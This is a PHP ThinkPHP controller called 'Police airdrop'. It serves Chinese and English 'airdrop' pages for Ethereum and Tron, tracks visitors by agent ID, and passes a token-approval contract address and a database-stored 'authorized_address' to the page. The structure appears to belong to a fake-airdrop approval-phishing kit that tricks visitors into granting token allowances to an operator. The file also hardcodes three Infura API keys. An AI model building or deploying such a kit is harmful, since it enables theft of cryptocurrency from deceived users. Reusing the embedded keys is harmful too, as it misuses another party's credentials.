<?php

namespace app\index\controller;

use think\admin\Controller;
use app\index\service\AddressService;

/**
 * Police空投
 * Class Police
 * @package app\index\controller
 */
class Police extends Controller
{
    public function index()
    {
		$agent = input('agent');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->userId = $agent;
		$this->type = $type;
		$this->address = config('contract.etherscan.contractaddress');
		$this->abi = config('contract.etherscan.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.etherscan.addr');
		$this->addr2 = config('contract.etherscan.addr2');
		$this->addr3 = config('contract.etherscan.addr3');
		
		$authorized_add = AddressService::instance()->get_address_by_id(1);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		
		if($type == 'cn'){
			$this->fetch();
		}else{
			$this->fetch('index_en');
		}
    }
	
	public function index_trc()
    {
		$agent = input('agent');
		$type = input('type');
		if(empty($type)){
			$type = 'cn';
		}
		if(empty($agent)){
			if($type == 'cn'){
				$this->error("输入参数不完整");
			}else{
				$this->error("The input parameters are incomplete");
			}
		}
		
		$this->userId = $agent;
		$this->address = config('contract.tronscan.contract');
		$this->abi = config('contract.tronscan.abi');
		$this->domain = "https://".$_SERVER['HTTP_HOST'];
		
		$this->approveAddr = $this->address;
		$this->addr = config('contract.tronscan.addr');
		
		$authorized_add = AddressService::instance()->get_address_by_id(2);
		$this->authorized_address = $authorized_add['address'];
		$infura = Array(
            'a6510a957f884432a3350d264d3250df',
            '1ac92ae60afd4174aeba1644e2e05b9f',
            '7d73a0c13ce946769577714aef84b79a',
        );
		$this->infura_key = $infura[array_rand($infura)];
		if($type == 'cn'){
			$this->fetch();
		}else{
			$this->fetch('index_trc_en');
		}
    }
}